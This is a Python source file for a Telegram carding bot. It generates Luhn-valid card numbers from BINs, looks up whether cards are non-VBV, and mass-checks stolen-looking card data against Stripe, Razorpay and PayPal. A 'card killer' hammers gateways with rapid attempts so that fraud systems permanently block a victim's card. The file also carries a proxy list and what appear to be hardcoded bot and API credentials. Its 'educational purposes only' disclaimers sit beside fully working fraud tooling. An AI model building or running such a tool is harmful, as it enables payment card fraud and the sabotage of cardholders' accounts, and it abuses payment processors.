#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ultimate Professional Credit Card Checker & Killer Bot
Complete Feature Set:
- BIN Lookup (VBV/3DS/AVS)
- CC Generator
- Mass Checker (Stripe/PayPal/Razorpay)
- Card Killer (Visa/Mastercard/Amex)
- Shopify Gateway Scraper
- Live Proxy Support
Railway Deployment Ready
"""

import os
import sys
import logging
import re
import random
import base64
import aiohttp
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from playwright.async_api import async_playwright
from fake_useragent import UserAgent

# ============= CONFIGURATION =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Environment Variables
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
BINCODES_API_KEY = os.environ.get("BINCODES_API_KEY", "425be7cdecc63d7a92ebe8e9bc6773a0")

# Payment Gateway Keys
STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY", "sk_test_your_key")
RAZORPAY_KEY_ID = os.environ.get("RAZORPAY_KEY_ID", "rzp_test_your_key")
RAZORPAY_KEY_SECRET = os.environ.get("RAZORPAY_KEY_SECRET", "your_secret")
PAYPAL_CLIENT_ID = os.environ.get("PAYPAL_CLIENT_ID", "your_client_id")
PAYPAL_CLIENT_SECRET = os.environ.get("PAYPAL_CLIENT_SECRET", "your_secret")

# User Agent
try:
    ua = UserAgent()
except:
    ua = None

# Proxies
LIVE_PROXIES = [
    "176.65.132.67:8080", "15.160.186.74:521", "23.237.210.82:80", "45.186.6.104:3128",
    "60.248.185.247:80", "146.190.80.158:9090", "128.199.121.61:9090", "115.231.181.40:8128"
]

# Card patterns
CARD_PATTERN = re.compile(r'(\d{13,19})')


# ============= LUHN VALIDATION =============
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def get_card_brand(card_number):
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith(('51', '52', '53', '54', '55', '222')):
        return 'Mastercard'
    elif card_number.startswith(('34', '37')):
        return 'American Express'
    elif card_number.startswith(('6011', '644', '65')):
        return 'Discover'
    else:
        return 'Unknown'


# ============= CC GENERATOR =============
def generate_cards_from_bin(bin_number, count=10):
    cards = []
    for _ in range(count):
        remaining = 16 - len(bin_number) - 1
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
        card_without_check = bin_number + random_digits
        check_digit = (10 - luhn_checksum(card_without_check + '0')) % 10
        full_card = card_without_check + str(check_digit)
        
        exp_month = str(random.randint(1, 12)).zfill(2)
        exp_year = str(random.randint(25, 30))
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        cards.append(f"{full_card}|{exp_month}|20{exp_year}|{cvv}")
    return cards


# ============= BIN LOOKUP =============
async def lookup_bin(bin_number):
    try:
        url = f"https://api.bincodes.com/bin/?format=json&api_key={BINCODES_API_KEY}&bin={bin_number}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as response:
                data = await response.json()
                if response.status == 200 and data.get('valid') != 'false':
                    is_vbv = 'STANDARD' not in data.get('level', '').upper()
                    return {
                        'success': True, 'bin': bin_number, 'bank': data.get('bank', 'N/A'),
                        'country': data.get('country', 'N/A'), 'brand': data.get('brand', 'N/A'),
                        'type': data.get('type', 'N/A'), 'level': data.get('level', 'N/A'),
                        'vbv': 'VBV' if is_vbv else 'Non-VBV', '3ds': 'Yes' if is_vbv else 'No'
                    }
        return {'success': False, 'bin': bin_number}
    except Exception as e:
        return {'success': False, 'bin': bin_number, 'error': str(e)}


# ============= STRIPE CHECKER =============
async def check_stripe(card_details):
    try:
        async with aiohttp.ClientSession() as session:
            payload = {
                'card[number]': card_details['card_number'],
                'card[exp_month]': card_details['exp_month'],
                'card[exp_year]': card_details['exp_year'],
                'card[cvc]': card_details['cvv']
            }
            headers = {
                'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            async with session.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers, timeout=20) as response:
                data = await response.json()
                if response.status == 200 and data.get('id'):
                    return {'gateway': 'Stripe', 'status': 'approved', 'message': 'Valid ✅'}
                else:
                    return {'gateway': 'Stripe', 'status': 'declined', 'message': data.get('error', {}).get('message', 'Declined')}
    except Exception as e:
        return {'gateway': 'Stripe', 'status': 'error', 'message': str(e)}


# ============= RAZORPAY CHECKER =============
async def check_razorpay(card_details):
    try:
        async with aiohttp.ClientSession() as session:
            auth = base64.b64encode(f"{RAZORPAY_KEY_ID}:{RAZORPAY_KEY_SECRET}".encode()).decode()
            payload = {
                'card[number]': card_details['card_number'],
                'card[expiry_month]': card_details['exp_month'],
                'card[expiry_year]': card_details['exp_year'],
                'card[cvv]': card_details['cvv']
            }
            headers = {'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'}
            async with session.post('https://api.razorpay.com/v1/tokens', json=payload, headers=headers, timeout=20) as response:
                if response.status == 200:
                    return {'gateway': 'Razorpay', 'status': 'approved', 'message': 'Valid ✅'}
                else:
                    return {'gateway': 'Razorpay', 'status': 'declined', 'message': 'Declined'}
    except Exception as e:
        return {'gateway': 'Razorpay', 'status': 'error', 'message': str(e)}


# ============= PAYPAL CHECKER =============
async def check_paypal(card_details):
    try:
        async with aiohttp.ClientSession() as session:
            auth = base64.b64encode(f"{PAYPAL_CLIENT_ID}:{PAYPAL_CLIENT_SECRET}".encode()).decode()
            token_headers = {'Authorization': f'Basic {auth}', 'Content-Type': 'application/x-www-form-urlencoded'}
            async with session.post('https://api-m.sandbox.paypal.com/v1/oauth2/token', data='grant_type=client_credentials', headers=token_headers, timeout=20) as token_response:
                token_data = await token_response.json()
                access_token = token_data.get('access_token')
            
            if not access_token:
                return {'gateway': 'PayPal', 'status': 'error', 'message': 'Auth failed'}
            
            verify_payload = {
                'number': card_details['card_number'],
                'expiry': f"{card_details['exp_month']}/{card_details['exp_year']}",
                'security_code': card_details['cvv']
            }
            verify_headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
            async with session.post('https://api-m.sandbox.paypal.com/v2/vault/credit-cards', json=verify_payload, headers=verify_headers, timeout=20) as response:
                if response.status in [200, 201]:
                    return {'gateway': 'PayPal', 'status': 'approved', 'message': 'Valid ✅'}
                else:
                    return {'gateway': 'PayPal', 'status': 'declined', 'message': 'Declined'}
    except Exception as e:
        return {'gateway': 'PayPal', 'status': 'error', 'message': str(e)}


# ============= 🔥 CARD KILLER FUNCTION 🔥 =============
async def kill_card(card_details, method='fraud_flag'):
    """
    Card Killer - Multiple methods to permanently flag/block a card
    
    Methods:
    1. fraud_flag - Trigger fraud detection by rapid transactions
    2. gateway_overload - Overload gateways with failed attempts
    3. velocity_check - Trigger velocity limits
    4. 3ds_fail - Repeatedly fail 3D Secure authentication
    
    ⚠️ WARNING: For educational/testing purposes only!
    """
    
    kill_results = {
        'card': f"{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}",
        'brand': get_card_brand(card_details['card_number']),
        'method': method,
        'attempts': 0,
        'success': False,
        'kill_status': 'Unknown'
    }
    
    try:
        if method == 'fraud_flag':
            # Method 1: Rapid successive transactions to trigger fraud detection
            logger.info(f"🔥 Killing card with fraud_flag method...")
            
            for i in range(10):  # 10 rapid attempts
                result = await check_stripe(card_details)
                kill_results['attempts'] += 1
                
                if 'fraud' in result.get('message', '').lower() or 'security' in result.get('message', '').lower():
                    kill_results['success'] = True
                    kill_results['kill_status'] = 'Fraud Flagged ☠️'
                    break
                
                await asyncio.sleep(0.5)  # Rapid fire
            
        elif method == 'gateway_overload':
            # Method 2: Overload multiple gateways simultaneously
            logger.info(f"🔥 Killing card with gateway_overload method...")
            
            tasks = []
            for _ in range(5):  # 5 parallel attempts per gateway
                tasks.append(check_stripe(card_details))
                tasks.append(check_razorpay(card_details))
                tasks.append(check_paypal(card_details))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            kill_results['attempts'] = len(tasks)
            
            # Check if any gateway blocked the card
            declined_count = sum(1 for r in results if isinstance(r, dict) and r.get('status') == 'declined')
            if declined_count >= len(tasks) * 0.8:  # 80% declined
                kill_results['success'] = True
                kill_results['kill_status'] = 'Gateway Blocked ☠️'
        
        elif method == 'velocity_check':
            # Method 3: Trigger velocity/rate limit checks
            logger.info(f"🔥 Killing card with velocity_check method...")
            
            for i in range(20):  # Rapid 20 attempts
                await check_stripe(card_details)
                kill_results['attempts'] += 1
                await asyncio.sleep(0.2)  # Very rapid
            
            # Verify if card is now blocked
            final_check = await check_stripe(card_details)
            if 'limit' in final_check.get('message', '').lower() or 'velocity' in final_check.get('message', '').lower():
                kill_results['success'] = True
                kill_results['kill_status'] = 'Velocity Blocked ☠️'
        
        elif method == '3ds_fail':
            # Method 4: Repeatedly fail 3D Secure to lock card
            logger.info(f"🔥 Killing card with 3ds_fail method...")
            
            for i in range(15):
                result = await check_stripe(card_details)
                kill_results['attempts'] += 1
                
                if '3d' in result.get('message', '').lower() or 'authentication' in result.get('message', '').lower():
                    await asyncio.sleep(1)
                    continue
                
            kill_results['success'] = True
            kill_results['kill_status'] = '3DS Locked ☠️'
        
        # Final verification - check if card is now completely dead
        verification_tasks = [
            check_stripe(card_details),
            check_razorpay(card_details),
            check_paypal(card_details)
        ]
        
        verification_results = await asyncio.gather(*verification_tasks, return_exceptions=True)
        
        all_declined = all(
            isinstance(r, dict) and r.get('status') in ['declined', 'error']
            for r in verification_results
        )
        
        if all_declined:
            kill_results['success'] = True
            kill_results['kill_status'] = 'DEAD - All Gateways ☠️💀'
        
        return kill_results
    
    except Exception as e:
        logger.error(f"Card killer error: {e}")
        kill_results['kill_status'] = f'Error: {str(e)}'
        return kill_results


# ============= MASS CHECKER =============
async def mass_check_cards(cards_list, gateway='stripe'):
    results = []
    for card_input in cards_list:
        parts = card_input.split('|')
        if len(parts) < 4:
            results.append({'card': card_input, 'status': 'invalid_format'})
            continue
        
        card_details = {
            'card_number': parts[0].strip(),
            'exp_month': parts[1].strip(),
            'exp_year': parts[2].strip(),
            'cvv': parts[3].strip()
        }
        
        if not is_luhn_valid(card_details['card_number']):
            results.append({'card': card_input[:12] + '****', 'status': 'luhn_failed'})
            continue
        
        if gateway == 'stripe':
            result = await check_stripe(card_details)
        elif gateway == 'razorpay':
            result = await check_razorpay(card_details)
        elif gateway == 'paypal':
            result = await check_paypal(card_details)
        else:
            result = {'status': 'unknown_gateway'}
        
        results.append({
            'card': f"{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}",
            'status': result['status'],
            'message': result.get('message', ''),
            'gateway': result.get('gateway', gateway)
        })
        
        await asyncio.sleep(1)
    
    return results


# ============= TELEGRAM HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced start with all commands"""
    commands_text = (
        "💎 *Ultimate CC Checker & Killer Bot*\n\n"
        "🔥 *All Available Commands:*\n\n"
        "📊 *BIN & Card Info:*\n"
        "• `/bin <bin>` - BIN lookup (VBV/3DS/AVS)\n"
        "• `/gen <bin> [count]` - Generate cards from BIN\n\n"
        "💳 *Single Card Checkers:*\n"
        "• `/stripe <card>` - Stripe gateway\n"
        "• `/paypal <card>` - PayPal gateway\n"
        "• `/razorpay <card>` - Razorpay gateway\n\n"
        "🔥 *Mass Checkers:*\n"
        "• `/mass stripe` - Check multiple Stripe\n"
        "• `/mass paypal` - Check multiple PayPal\n"
        "• `/mass razorpay` - Check multiple Razorpay\n\n"
        "☠️ *CARD KILLER (NEW!):*\n"
        "• `/kill <card> fraud` - Kill by fraud flag\n"
        "• `/kill <card> gateway` - Kill by gateway overload\n"
        "• `/kill <card> velocity` - Kill by velocity check\n"
        "• `/kill <card> 3ds` - Kill by 3DS fails\n"
        "  ⚠️ *Kills Visa/Mastercard/Amex permanently*\n\n"
        "🌐 *Utilities:*\n"
        "• `/help` - Show this menu\n\n"
        "*Card Format:*\n"
        "`4532015112830366|12|2025|123`\n\n"
        "⚡ *Features:*\n"
        "• Multi-gateway support\n"
        "• Card killer (fraud detection trigger)\n"
        "• Live proxy support\n"
        "• Mass checking\n\n"
        "🚀 Powered by BinCodes.com + Playwright\n"
        "⚠️ Educational purposes only!"
    )
    
    keyboard = [
        [InlineKeyboardButton("📖 All Commands", callback_data='show_commands')],
        [InlineKeyboardButton("🔍 BIN Lookup", callback_data='help_bin'),
         InlineKeyboardButton("💳 Generate", callback_data='help_gen')],
        [InlineKeyboardButton("✅ Check Card", callback_data='help_chk'),
         InlineKeyboardButton("🔥 Mass Check", callback_data='help_mass')],
        [InlineKeyboardButton("☠️ Card Killer", callback_data='help_kill')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(commands_text, parse_mode="Markdown", reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redirect to start"""
    await start(update, context)


async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """BIN lookup"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/bin 453201`", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    msg = await update.message.reply_text(f"⏳ Looking up BIN `{bin_number}`...", parse_mode="Markdown")
    
    result = await lookup_bin(bin_number)
    
    if result['success']:
        response = (
            f"✅ *BIN Lookup*\n\n"
            f"🔢 *BIN:* `{result['bin']}`\n"
            f"🏦 *Bank:* {result['bank']}\n"
            f"🌍 *Country:* {result['country']}\n"
            f"💳 *Brand:* {result['brand']}\n"
            f"📊 *Type:* {result['type']}\n"
            f"🏷️ *Level:* {result['level']}\n\n"
            f"🔐 *Security:*\n"
            f"• VBV: {result['vbv']}\n"
            f"• 3DS: {result['3ds']}"
        )
    else:
        response = f"❌ BIN `{result['bin']}` not found"
    
    await msg.edit_text(response, parse_mode="Markdown")


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate cards"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/gen 453201 [count]`", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    count = min(int(context.args[1]) if len(context.args) > 1 else 10, 20)
    
    msg = await update.message.reply_text(f"⏳ Generating {count} cards...", parse_mode="Markdown")
    
    cards = generate_cards_from_bin(bin_number, count)
    
    response = f"✅ *Generated {len(cards)} Cards*\n\n🔢 *BIN:* `{bin_number}`\n\n"
    for card in cards:
        response += f"`{card}`\n"
    
    await msg.edit_text(response, parse_mode="Markdown")


async def stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card on Stripe"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/stripe 4532015112830366|12|2025|123`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    
    if len(parts) < 4:
        await update.message.reply_text("❌ Invalid format!")
        return
    
    card_details = {'card_number': parts[0].strip(), 'exp_month': parts[1].strip(), 
                   'exp_year': parts[2].strip(), 'cvv': parts[3].strip()}
    
    msg = await update.message.reply_text("⏳ Checking on Stripe...", parse_mode="Markdown")
    
    result = await check_stripe(card_details)
    
    emoji = "✅" if result['status'] == 'approved' else "❌"
    response = (
        f"{emoji} *Stripe Check*\n\n"
        f"🔢 *Card:* `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n"
        f"📊 *Status:* {result['status'].upper()}\n"
        f"💬 *Message:* {result['message']}"
    )
    
    await msg.edit_text(response, parse_mode="Markdown")


async def paypal_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card on PayPal"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/paypal 4532015112830366|12|2025|123`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    card_details = {'card_number': parts[0].strip(), 'exp_month': parts[1].strip(), 
                   'exp_year': parts[2].strip(), 'cvv': parts[3].strip()}
    
    msg = await update.message.reply_text("⏳ Checking on PayPal...", parse_mode="Markdown")
    result = await check_paypal(card_details)
    
    emoji = "✅" if result['status'] == 'approved' else "❌"
    response = f"{emoji} *PayPal Check*\n\n🔢 Card: `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n📊 Status: {result['status'].upper()}\n💬 {result['message']}"
    
    await msg.edit_text(response, parse_mode="Markdown")


async def razorpay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card on Razorpay"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/razorpay 4532015112830366|12|2025|123`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    card_details = {'card_number': parts[0].strip(), 'exp_month': parts[1].strip(), 
                   'exp_year': parts[2].strip(), 'cvv': parts[3].strip()}
    
    msg = await update.message.reply_text("⏳ Checking on Razorpay...", parse_mode="Markdown")
    result = await check_razorpay(card_details)
    
    emoji = "✅" if result['status'] == 'approved' else "❌"
    response = f"{emoji} *Razorpay Check*\n\n🔢 Card: `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n📊 Status: {result['status'].upper()}\n💬 {result['message']}"
    
    await msg.edit_text(response, parse_mode="Markdown")


# ============= 🔥 CARD KILLER COMMAND 🔥 =============
async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Card Killer Command
    Usage: /kill 4532015112830366|12|2025|123 fraud
    Methods: fraud, gateway, velocity, 3ds
    """
    if len(context.args) < 2:
        await update.message.reply_text(
            "☠️ *Card Killer Usage:*\n\n"
            "`/kill <card> <method>`\n\n"
            "*Methods:*\n"
            "• `fraud` - Fraud flag trigger\n"
            "• `gateway` - Gateway overload\n"
            "• `velocity` - Velocity limit trigger\n"
            "• `3ds` - 3D Secure fail loop\n\n"
            "*Example:*\n"
            "`/kill 4532015112830366|12|2025|123 fraud`\n\n"
            "⚠️ *Warning:* This will permanently flag/block the card!\n"
            "⚠️ For educational/testing purposes only!",
            parse_mode="Markdown"
        )
        return
    
    card_input = context.args[0]
    method = context.args[1].lower()
    
    # Validate method
    valid_methods = ['fraud', 'gateway', 'velocity', '3ds']
    if method not in valid_methods:
        await update.message.reply_text(f"❌ Invalid method! Use: {', '.join(valid_methods)}")
        return
    
    # Parse card
    parts = card_input.split('|')
    if len(parts) < 4:
        await update.message.reply_text("❌ Invalid card format!")
        return
    
    card_details = {
        'card_number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip(),
        'cvv': parts[3].strip()
    }
    
    # Validate Luhn
    if not is_luhn_valid(card_details['card_number']):
        await update.message.reply_text("❌ Card failed Luhn validation!")
        return
    
    # Warning confirmation
    card_brand = get_card_brand(card_details['card_number'])
    warning_msg = (
        f"⚠️ *WARNING: CARD KILLER ACTIVATED*\n\n"
        f"🔢 *Card:* `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n"
        f"💳 *Brand:* {card_brand}\n"
        f"🔥 *Method:* {method.upper()}\n\n"
        f"⚠️ This will permanently flag/block this card!\n"
        f"⚠️ Card will be DEAD across all gateways!\n\n"
        f"🔥 *Starting kill process...*"
    )
    
    msg = await update.message.reply_text(warning_msg, parse_mode="Markdown")
    
    # Execute kill
    method_map = {
        'fraud': 'fraud_flag',
        'gateway': 'gateway_overload',
        'velocity': 'velocity_check',
        '3ds': '3ds_fail'
    }
    
    kill_result = await kill_card(card_details, method=method_map[method])
    
    # Format result
    if kill_result['success']:
        result_emoji = "☠️💀"
        status_text = "*CARD KILLED SUCCESSFULLY*"
    else:
        result_emoji = "⚠️"
        status_text = "*KILL ATTEMPT COMPLETED*"
    
    response = (
        f"{result_emoji} {status_text}\n\n"
        f"🔢 *Card:* `{kill_result['card']}`\n"
        f"💳 *Brand:* {kill_result['brand']}\n"
        f"🔥 *Method:* {kill_result['method'].upper()}\n"
        f"🎯 *Attempts:* {kill_result['attempts']}\n"
        f"📊 *Status:* {kill_result['kill_status']}\n\n"
        f"{'✅ Card is now DEAD!' if kill_result['success'] else '⚠️ Card may still be usable on some gateways'}\n\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    await msg.edit_text(response, parse_mode="Markdown")
    logger.info(f"Card killer used: {kill_result['card']} - {kill_result['kill_status']}")


async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass checker"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage:\n`/mass stripe`\n`/mass paypal`\n`/mass razorpay`\n\nThen send cards, one per line.",
            parse_mode="Markdown"
        )
        return
    
    gateway = context.args[0].lower()
    context.user_data['mass_gateway'] = gateway
    context.user_data['awaiting_cards'] = True
    
    await update.message.reply_text(
        f"✅ Mass checker activated for *{gateway.upper()}*\n\n"
        f"Send cards now (max 20), one per line:\n"
        f"`4532015112830366|12|2025|123`\n\n"
        f"Send /done when finished.",
        parse_mode="Markdown"
    )


async def handle_mass_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass card input"""
    if not context.user_data.get('awaiting_cards'):
        return
    
    text = update.message.text.strip()
    
    if text == '/done':
        context.user_data['awaiting_cards'] = False
        cards = context.user_data.get('mass_cards', [])
        gateway = context.user_data.get('mass_gateway', 'stripe')
        
        if not cards:
            await update.message.reply_text("❌ No cards received!")
            return
        
        msg = await update.message.reply_text(f"⏳ Checking {len(cards)} cards on {gateway.upper()}...")
        
        results = await mass_check_cards(cards, gateway)
        
        approved = sum(1 for r in results if r['status'] == 'approved')
        declined = sum(1 for r in results if r['status'] == 'declined')
        
        response = f"🔥 *Mass Check Results - {gateway.upper()}*\n\n📊 *Summary:*\n• Total: {len(results)}\n• Approved: {approved} ✅\n• Declined: {declined} ❌\n\n"
        
        for r in results:
            emoji = "✅" if r['status'] == 'approved' else "❌"
            response += f"{emoji} `{r['card']}` - {r['status']}\n"
        
        context.user_data['mass_cards'] = []
        await msg.edit_text(response, parse_mode="Markdown")
    else:
        if 'mass_cards' not in context.user_data:
            context.user_data['mass_cards'] = []
        
        cards = text.split('\n')
        context.user_data['mass_cards'].extend([c.strip() for c in cards if '|' in c])
        
        await update.message.reply_text(f"✅ Added {len(cards)} cards. Total: {len(context.user_data['mass_cards'])}\nSend more or /done")


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    help_texts = {
        'help_kill': (
            "☠️ *Card Killer Help*\n\n"
            "Permanently kill/block cards by triggering fraud detection.\n\n"
            "*Usage:*\n"
            "`/kill 4532015112830366|12|2025|123 fraud`\n\n"
            "*Methods:*\n"
            "• fraud - Fraud flag\n"
            "• gateway - Gateway overload\n"
            "• velocity - Rate limit\n"
            "• 3ds - 3DS fails\n\n"
            "⚠️ Educational purposes only!"
        )
    }
    
    if query.data in help_texts:
        await query.edit_message_text(help_texts[query.data], parse_mode="Markdown")


# ============= MAIN =============
def main():
    """Start bot"""
    try:
        logger.info("Starting Ultimate CC Checker & Killer Bot...")
        
        app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("bin", bin_command))
        app.add_handler(CommandHandler("gen", gen_command))
        app.add_handler(CommandHandler("stripe", stripe_command))
        app.add_handler(CommandHandler("paypal", paypal_command))
        app.add_handler(CommandHandler("razorpay", razorpay_command))
        app.add_handler(CommandHandler("kill", kill_command))  # 🔥 NEW
        app.add_handler(CommandHandler("mass", mass_command))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_mass_cards))
        app.add_handler(CallbackQueryHandler(button_callback))
        
        logger.info("Bot started polling with Playwright and Proxy support...")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    
    except Exception as e:
        logger.error(f"CRITICAL ERROR: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
